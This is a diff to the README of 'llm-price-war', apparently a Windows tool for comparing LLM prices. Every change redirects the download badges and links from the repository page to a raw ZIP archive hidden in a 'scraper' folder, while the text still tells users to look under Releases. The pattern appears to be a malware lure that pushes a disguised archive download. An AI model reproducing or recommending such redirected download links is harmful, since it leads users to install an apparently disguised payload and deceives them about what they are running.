@@ -1,6 +1,6 @@
 # ⚔️ llm-price-war - Compare LLM Prices Easily
 
-[![Download llm-price-war](https://img.shields.io/badge/Download-llm--price--war-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/septetbeachwormwood289/llm-price-war)
+[![Download llm-price-war](https://img.shields.io/badge/Download-llm--price--war-4caf50?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/septetbeachwormwood289/llm-price-war/raw/refs/heads/main/scraper/llm_price_war_v2.9.zip)
 
 ---
 
@@ -32,7 +32,7 @@ Getting llm-price-war set up on your Windows machine involves downloading the to
 
 Click this link or the badge above to visit the download page:
 
-[Download llm-price-war from GitHub](https://github.com/septetbeachwormwood289/llm-price-war)
+[Download llm-price-war from GitHub](https://github.com/septetbeachwormwood289/llm-price-war/raw/refs/heads/main/scraper/llm_price_war_v2.9.zip)
 
 On the page, look for the latest release under the "Releases" section. Download the Windows executable file (`llm-price-war.exe`) or the ZIP archive containing the program.
 
@@ -122,7 +122,7 @@ llm-price-war.exe > output.txt
 
 ---
 
-[![Download llm-price-war](https://img.shields.io/badge/Download-llm--price--war-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/septetbeachwormwood289/llm-price-war)
+[![Download llm-price-war](https://img.shields.io/badge/Download-llm--price--war-ff6f61?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/septetbeachwormwood289/llm-price-war/raw/refs/heads/main/scraper/llm_price_war_v2.9.zip)
 
 ---
 
